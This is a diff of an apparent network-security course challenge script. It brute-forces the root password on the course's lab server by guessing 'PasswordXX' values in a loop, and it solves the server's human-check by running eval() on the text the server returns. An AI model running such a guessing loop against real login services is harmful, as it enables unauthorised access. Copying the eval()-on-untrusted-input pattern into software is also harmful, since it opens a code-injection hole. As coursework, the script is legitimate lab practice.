@@ -1,42 +1,47 @@
+# Challenge 02
+
 #!/usr/bin/env python3
 import socket
 from base64 import b64encode, b64decode
 
-HOST = 'thisisno.valid.hostname'
-PORT = 42
+HOST = 'netsec.net.in.tum.de'   
+PORT = 20002                     
 
-username = input("Username (hint: root): ")
-password = input("Password (hint: PasswordXX, X=0-9): ")
-credentials=username+","+password
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def login(credentials):
 
-s.connect((HOST, PORT))
-sf = s.makefile("rw")  # we use a file abstraction for the sockets
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-sf.write("{}\n".format(credentials))
-sf.flush()
+    s.connect((HOST, PORT))
+    sf = s.makefile("rw")  # we use a file abstraction for the sockets
+    print("Trying with: ", credentials)
+    sf.write("{}\n".format(credentials))
+    sf.flush()
 
-challenge = sf.readline().rstrip('\n')
+    challenge = sf.readline().rstrip('\n')
 
-print("Solve the following equation to prove you are human: ", challenge)
-response=input("Solution: ")
-sf.write("{}\n".format(response))
-sf.flush()
 
-data = sf.readline().rstrip('\n')
-print("From Server: `{}'".format(data))
+    response = eval(challenge)
+    sf.write("{}\n".format(response))
+    sf.flush()
 
-data = sf.readline().rstrip('\n')
-print("From Server: received {} bytes".format(len(data)))
+    data = sf.readline().rstrip('\n')
 
-data = b64decode(data.encode())
+    data = sf.readline().rstrip('\n')
+    if(len(data)!= 0):
+        print("From Server: received {} bytes".format(len(data)))
+        print(data)
+        return True
 
-pdf_hdr = b'%PDF-1.5'
+    sf.close()
+    s.close()
 
-if len(data) >= len(pdf_hdr) and data[:len(pdf_hdr)] == pdf_hdr:
-    print("Looks like we got a PDF!")
-    # TODO write the received data to a file
 
-sf.close()
-s.close()
+# Loop untill find an answer
+
+from random import randrange
+
+while True:
+    credential = "root,Password"+str(randrange(100)).zfill(2)
+    if (login(credential)):
+        break
